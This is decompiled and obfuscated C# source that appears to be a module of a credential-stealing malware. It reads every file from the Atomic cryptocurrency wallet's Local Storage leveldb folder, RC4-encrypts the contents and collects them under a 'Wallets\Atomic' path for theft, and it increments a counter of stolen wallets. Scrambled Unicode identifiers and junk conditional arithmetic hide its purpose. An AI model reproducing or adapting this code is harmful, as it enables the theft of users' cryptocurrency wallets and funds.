using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000007 RID: 7
	internal class Class_4
	{
		// Token: 0x0600000F RID: 15 RVA: 0x000024B4 File Offset: 0x000006B4
		public static void gmethod_3(string str_0)
		{
			try
			{
				if (Directory.Exists(Class_4.field_1))
				{
					string[] files = Directory.GetFiles(Class_4.field_1);
					int num2;
					int num = num2 = -4;
					if (1535033085 == 1535033085)
					{
						num2 = num + 4;
					}
					int num3;
					int num5;
					for (int i = num2; i < files.Length; i = num3 + num5)
					{
						string path = files[i];
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + Class_4.field_2 + Path.GetFileName(path), Class_47.RC4(File.ReadAllBytes(path)));
						num3 = i;
						int num4 = num5 = -3;
						if (1402976858 == 1402976858)
						{
							num5 = num4 + 4;
						}
					}
					int num6 = Class_4.field_0;
					int num8;
					int num7 = num8 = -3;
					if (1387334314 == 1387334314)
					{
						num8 = num7 + 4;
					}
					Class_4.field_0 = num6 + num8;
					int num9 = Class_54.field_0;
					int num11;
					int num10 = num11 = -3;
					if (359106911 == 359106911)
					{
						num11 = num10 + 4;
					}
					Class_54.field_0 = num9 + num11;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000011 RID: 17
		public static int field_0;

		// Token: 0x04000012 RID: 18
		public static string field_1 = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\atomic\\Local Storage\\leveldb\\";

		// Token: 0x04000013 RID: 19
		public static string field_2 = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
	}
}
